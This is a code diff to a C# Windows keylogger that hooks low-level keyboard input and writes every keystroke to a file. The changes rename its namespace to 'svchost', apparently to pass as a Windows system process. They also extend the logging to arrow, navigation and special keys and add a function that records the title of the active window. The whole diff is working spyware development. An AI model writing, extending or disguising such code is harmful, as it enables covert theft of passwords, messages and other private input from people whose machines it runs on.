@@ -3,8 +3,9 @@ using System.Windows.Forms;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.IO;
+using System.Text;
 
-namespace Keylogger
+namespace svchost
 {
     class Program
     {
@@ -94,6 +95,62 @@ namespace Keylogger
                     case Keys.RShiftKey:
                         break;
 
+                    case Keys.Down:
+                        sw.Write("{DOWN}");
+                        break;
+
+                    case Keys.Up:
+                        sw.Write("{UP}");
+                        break;
+
+                    case Keys.Right:
+                        sw.Write("{RIGHT}");
+                        break;
+
+                    case Keys.Left:
+                        sw.Write("{LEFT}");
+                        break;
+
+                    case Keys.CapsLock:
+                        sw.Write("{****CAPSLOCK****}");
+                        break;
+
+                    case Keys.Delete:
+                        sw.Write("{DEL}");
+                        break;
+
+                    case Keys.Insert:
+                        sw.Write("{INSERT}");
+                        break;
+
+                    case Keys.Home:
+                        sw.Write("{HOME}");
+                        break;
+
+                    case Keys.PageUp:
+                        sw.Write("{PAGE UP}");
+                        break;
+
+                    case Keys.PageDown:
+                        sw.Write("{PAGE DOWN}");
+                        break;
+
+                    case Keys.End:
+                        sw.Write("{END}");
+                        break;
+
+                    case Keys.NumLock:
+                        sw.Write("{NUM}");
+                        break;
+
+                    case Keys.Divide:
+                        sw.Write("/");
+                        break;
+
+                    case Keys.Multiply:
+                        sw.Write("*");
+                        break;
+
                     case Keys.Oemcomma:
                         if (Control.ModifierKeys != Keys.Shift)
                             sw.Write(",");
@@ -158,7 +215,10 @@ namespace Keylogger
                         break;
 
                     case Keys.OemPipe:
-                        sw.Write("|");
+                        if (Control.ModifierKeys != Keys.Shift)
+                            sw.Write("\\");
+                        else
+                            sw.Write("|");
                         break;
 
                     case Keys.OemQuotes:
@@ -166,10 +226,6 @@ namespace Keylogger
                             sw.Write("'");
                         else
                             sw.Write("\"");
-                        break;
-
-                    case Keys.OemBackslash:
-                        sw.Write("\\");
                         break;
 
                     case Keys.LMenu:
@@ -251,6 +307,19 @@ namespace Keylogger
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
+        private string GetActiveWindowTitle()
+        {
+            const int nChars = 256;
+            StringBuilder Buff = new StringBuilder(nChars);
+            IntPtr handle = GetForegroundWindow();
+
+            if (GetWindowText(handle, Buff, nChars) > 0)
+            {
+                return Buff.ToString();
+            }
+            return null;
+        }
+
         //These Dll's will handle the hooks. Yaaar mateys!
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
@@ -264,6 +333,12 @@ namespace Keylogger
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
             IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll")]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
